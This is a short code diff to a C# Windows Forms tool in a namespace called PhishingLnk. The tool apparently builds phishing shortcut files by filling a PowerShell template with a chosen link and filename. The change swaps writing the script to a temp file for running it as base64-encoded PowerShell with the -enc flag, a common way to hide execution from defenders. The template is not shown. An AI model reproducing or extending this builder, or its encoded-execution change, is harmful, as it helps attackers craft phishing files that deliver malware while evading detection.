@@ -19,9 +19,8 @@ namespace PhishingLnk
             string lnk = textBox1.Text;
             string filename = textBox2.Text;
             builder = builder.Replace("%lnk%", lnk).Replace("%filename%", filename);
-            string tmp = Path.Combine(Path.GetTempPath(), "Tempbuilder.ps1");
-            File.WriteAllText(tmp, builder);
-            Process.Start("Powershell.exe", tmp);
+            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(builder)); 
+            Process.Start("Powershell.exe", "-enc " + b64);
             MessageBox.Show("Done.\nFile saved on your desktop.");
         }
     }
